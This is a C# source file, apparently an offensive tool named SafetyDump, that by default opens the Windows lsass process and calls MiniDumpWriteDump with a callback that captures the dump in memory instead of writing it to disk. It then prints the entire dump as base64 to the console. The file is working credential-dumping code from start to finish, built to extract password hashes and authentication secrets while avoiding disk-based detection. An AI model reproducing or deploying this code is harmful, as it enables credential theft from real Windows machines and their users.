using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Text;

namespace SafetyDump
{
    internal static class Program
    {
        
        private static void Minidump(int pid = -1)
        {
            IntPtr targetProcessHandle;
            uint targetProcessId = 0;

            Process targetProcess = null;
            if (pid == -1)
            {
                var processes = Process.GetProcessesByName("lsass");
                targetProcess = processes[0];
            }
            else
            {
                try
                {
                    targetProcess = Process.GetProcessById(pid);
                }
                catch (Exception e)
                {
                    Console.WriteLine($"\n[-]Exception: {e.Message}\n");
                    return;
                }
            }

            try
            {
                targetProcessId = (uint) targetProcess.Id;
                targetProcessHandle = targetProcess.Handle;
            }
            catch (Exception e)
            {
                Console.WriteLine($"\n[-] Error getting handle to {targetProcess.ProcessName} ({targetProcess.Id}): {e.Message}\n");
                return;
            }
            
            var arrays = new HashSet<WriteSet>();
            var maxOffset = 0;
            var maxOffsetLength = 0;

            var callbackPtr = new Internals.MinidumpCallbackRoutine((param, input, output) =>
            {
                var inputStruct = Marshal.PtrToStructure<Internals.MINIDUMP_CALLBACK_INPUT>(input);
                var outputStruct = Marshal.PtrToStructure<Internals.MINIDUMP_CALLBACK_OUTPUT>(output);
                switch (inputStruct.CallbackType)
                {
                    case Internals.MINIDUMP_CALLBACK_TYPE.IoStartCallback:
                        outputStruct.status = Internals.HRESULT.S_FALSE;
                        Marshal.StructureToPtr(outputStruct, output, true);
                        return true;
                    case Internals.MINIDUMP_CALLBACK_TYPE.IoWriteAllCallback:
                        var ioStruct = inputStruct.Io;
                        var bytes = new byte[ioStruct.BufferBytes];
                        Marshal.Copy(ioStruct.Buffer, bytes, 0, ioStruct.BufferBytes);
                        arrays.Add(new WriteSet((int)ioStruct.Offset, ioStruct.BufferBytes, bytes));
                        if ((int)ioStruct.Offset > maxOffset)
                        {
                            maxOffset = (int)(ioStruct.Offset);
                            maxOffsetLength = ioStruct.BufferBytes;
                        }
                        outputStruct.status = Internals.HRESULT.S_OK;
                        Marshal.StructureToPtr(outputStruct, output, true);
                        return true;
                    case Internals.MINIDUMP_CALLBACK_TYPE.IoFinishCallback:
                        outputStruct.status = Internals.HRESULT.S_OK;
                        Marshal.StructureToPtr(outputStruct, output, true);
                        return true;
                    default:
                        return true;
                }
            });

            var callbackInfo = new Internals.MINIDUMP_CALLBACK_INFORMATION
            {
                CallbackRoutine = callbackPtr, CallbackParam = IntPtr.Zero
            };

            var size = Marshal.SizeOf(callbackInfo);
            var callbackInfoPtr = Marshal.AllocHGlobal(size);
            Marshal.StructureToPtr(callbackInfo, callbackInfoPtr, false);

            if (Internals.MiniDumpWriteDump(targetProcessHandle, targetProcessId, IntPtr.Zero,(uint) 2, IntPtr.Zero, IntPtr.Zero, callbackInfoPtr))
            {
                Console.OutputEncoding = Encoding.UTF8;
                var dump = new byte[maxOffset + maxOffsetLength];
                foreach (var writeSet in arrays)
                {
                    Array.Copy(writeSet.Bytes, 0, dump, writeSet.Offset, writeSet.Length);                    
                }
                Console.Write(Convert.ToBase64String((dump)));
                return;
    
            }
            Console.WriteLine("[-] Dump failed");
            Console.WriteLine(Marshal.GetLastWin32Error());

        }
    
        private static void Main(string[] args)
        {

            if (IntPtr.Size != 8)
            {
                Console.WriteLine("\n[-] Process is not 64-bit!\n");
                return;
            }

            if (args.Length == 0)
            {
                Minidump();
            }
            else
            {
                var pid = -1;
                try
                {
                    pid = Convert.ToInt32(args[0]);
                }
                catch (Exception e)
                {
                    Console.WriteLine($"\n[-] Error converting argument ({args[0]}) to PID: {e.Message}");
                    return;
                }
                Minidump(pid);
            }
        }
    }

    internal class WriteSet
    {
        internal int Offset { get; }
        internal int Length { get; }
        internal byte[] Bytes { get; }

        public WriteSet(int offset, int length, byte[] bytes)
        {
            this.Offset = offset;
            this.Length = length;
            this.Bytes = bytes;
        }

    }
}